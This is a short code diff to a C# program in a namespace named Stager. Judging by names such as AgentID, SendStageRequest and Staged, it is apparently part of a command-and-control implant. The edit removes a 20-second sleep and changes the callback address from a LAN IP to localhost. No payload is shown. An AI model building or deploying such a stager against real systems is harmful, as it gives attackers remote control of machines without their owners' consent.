@@ -50,9 +50,6 @@ namespace Stager
 
             CommModule = new HTTPCommModule(AgentID, ConnectAddress, ConnectPort);
             SendStageRequest();
-
-            System.Threading.Thread.Sleep(20000);
-
             CommModule.Start();
 
             while (!Staged)
@@ -111,7 +108,7 @@ namespace Stager
 
         static string ConnectAddress
         {
-            get { return "192.168.1.115"; }
+            get { return "127.0.0.1"; }
         }
 
         static int ConnectPort
